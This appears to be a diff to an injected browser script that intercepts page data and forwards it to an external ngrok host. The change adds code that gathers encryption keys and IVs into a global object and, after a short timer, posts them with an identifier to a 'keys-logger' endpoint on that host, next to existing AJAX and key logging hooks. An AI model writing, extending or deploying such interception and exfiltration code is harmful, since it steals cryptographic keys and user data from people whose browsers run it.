@@ -1,7 +1,8 @@
-// alert("Injected ^_^")
+window.keys = {}
 window.rip_configs = {
   host: "https://eel-moral-ape.ngrok-free.app",
   ajax_logger: "/api/ajax-logger",
+  keys_logger: "/api/keys-logger",
 }
 
 window.logger_callback = async (url, data_logger, show_alert = false) => {
@@ -32,6 +33,20 @@ window.ajax_logger = function (data) {
 }
 
 window.key_logger = function (data) {
-  const { host, key_logger } = window.rip_configs || {}
+  const { host, keys_logger, key_logger } = window.rip_configs || {}
+
+  if (data.key && data.iv && host) {
+    window.keys[data.key] = data.iv
+
+    if (window.key_logger_timeout) {
+      clearTimeout(window.key_logger_timeout)
+      window.key_logger_timeout = null
+    }
+
+    window.key_logger_timeout = setTimeout(() => {
+      window.logger_callback(host + keys_logger, { fid: window.fid, keys: window.keys }, true)
+    }, 3000)
+  }
+
   if (host && key_logger) window.logger_callback(host + key_logger, data)
 }
